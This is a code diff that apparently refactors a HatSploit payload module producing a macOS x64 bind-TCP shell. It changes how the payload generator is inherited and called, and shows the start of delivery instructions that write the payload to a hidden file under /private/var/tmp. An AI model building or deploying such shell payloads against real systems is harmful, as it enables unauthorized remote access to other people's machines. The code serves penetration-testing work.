@@ -25,12 +25,9 @@
 #
 
 from core.lib.payload import HatSploitPayload
+from utils.payload.payload import PayloadGenerator
 
-from utils.payload.payload_generator import payload_generator
-
-class HatSploitPayload(HatSploitPayload):
-    payload_generator = payload_generator()
-
+class HatSploitPayload(HatSploitPayload, PayloadGenerator):
     details = {
         'Name': "macOS x64 Shell Bind TCP",
         'Payload': "macos/x64/shell_bind_tcp",
@@ -66,9 +63,9 @@ class HatSploitPayload(HatSploitPayload):
 
     def run(self):
         bind_port, executable_format = self.parser.parse_options(self.options)
-        bind_port = self.payload_generator.port_to_bytes(bind_port)
+        bind_port = self.port_to_bytes(bind_port)
 
-        if not executable_format in self.payload_generator.formats.keys():
+        if not executable_format in self.formats.keys():
             self.badges.output_error("Invalid executable format!")
             return None
 
@@ -127,7 +124,7 @@ class HatSploitPayload(HatSploitPayload):
         )
 
         self.badges.output_process("Generating payload...")
-        payload = self.payload_generator.generate(executable_format, 'x64', shellcode)
+        payload = self.generate(executable_format, 'x64', shellcode)
 
         instructions = ""
         instructions += "cat >/private/var/tmp/.payload;"
